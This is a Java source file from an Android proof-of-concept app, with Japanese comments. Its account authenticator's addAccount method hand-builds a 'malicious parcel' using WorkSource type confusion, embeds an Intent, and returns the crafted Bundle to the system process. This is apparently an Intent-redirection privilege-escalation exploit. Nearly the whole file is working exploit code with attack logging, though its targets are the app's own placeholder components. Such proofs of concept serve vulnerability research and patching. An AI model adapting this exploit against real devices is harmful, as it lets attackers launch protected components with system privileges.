package com.example.tzpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;

public class MyAuthenticator extends AbstractAccountAuthenticator {
    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        MainActivity.appendLog("[*] addAccount called. Building malicious parcel with Intent...");

        // 起動するIntent（SystemCommandReceiverはBroadcastReceiverなので、直接起動はできないが、
        // ここではProofActivityを起動して、その中でReceiverを呼び出すようにする）
        // しかし、より直接的にReceiverを起動するには、Intentのactionを指定する方法もある。
        // ここでは、BroadcastReceiverを起動するIntentを作成
        Intent exploitIntent = new Intent();
        exploitIntent.setComponent(new ComponentName(
                "com.example.tzpoc",
                "com.example.tzpoc.SystemCommandReceiver"
        ));
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "com.example.tzpoc",
                "com.example.tzpoc.ProofActivity"
        ));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Parcel intentParcel = Parcel.obtain();
        intent.writeToParcel(intentParcel, 0);

        Parcel dataParcel = Parcel.obtain();
        Parcel finalParcel = Parcel.obtain();

        // WorkSource ヘッダー（型混淆用）
        dataParcel.writeInt(3);
        dataParcel.writeInt(13); // WorkSource type
        dataParcel.writeInt(2);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(6);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(4);
        dataParcel.writeString("android.os.WorkSource");
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(-1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(13);
        dataParcel.writeInt(68);
        dataParcel.writeInt(11);
        dataParcel.writeInt(0);
        dataParcel.writeInt(7);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(1);
        dataParcel.writeInt(1);
        dataParcel.writeInt(13);
        dataParcel.writeInt(22);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(0);
        dataParcel.writeInt(13);
        dataParcel.writeInt(-1);

        // Intent データを埋め込む（キーは "result" に変更）
        int startPos = dataParcel.dataPosition();
        dataParcel.writeString("result");
        dataParcel.writeInt(4); // PARCELABLE
        dataParcel.writeString("android.content.Intent");
        dataParcel.appendFrom(intentParcel, 0, intentParcel.dataSize());

        int endPos = dataParcel.dataPosition();
        dataParcel.setDataPosition(startPos - 4);
        dataParcel.writeInt(endPos - startPos);
        dataParcel.setDataPosition(endPos);

        int totalSize = dataParcel.dataSize();
        MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));

        finalParcel.writeInt(totalSize);
        finalParcel.writeInt(0x4c444e42); // "BDNL"
        finalParcel.appendFrom(dataParcel, 0, totalSize);
        finalParcel.setDataPosition(0);

        Bundle result = new Bundle();
        try {
            result.readFromParcel(finalParcel);
            MainActivity.appendLog("[+] Malicious bundle created.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] Failed to read malicious parcel: " + e.getMessage());
            // クラッシュを回避するため空のBundleを返す
            return new Bundle();
        }

        intentParcel.recycle();
        dataParcel.recycle();
        finalParcel.recycle();

        MainActivity.appendLog("[*] Returning malicious bundle to system process.");
        return result;
    }

    // その他の必須オーバーライド（空実装）
    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }
    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }
    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
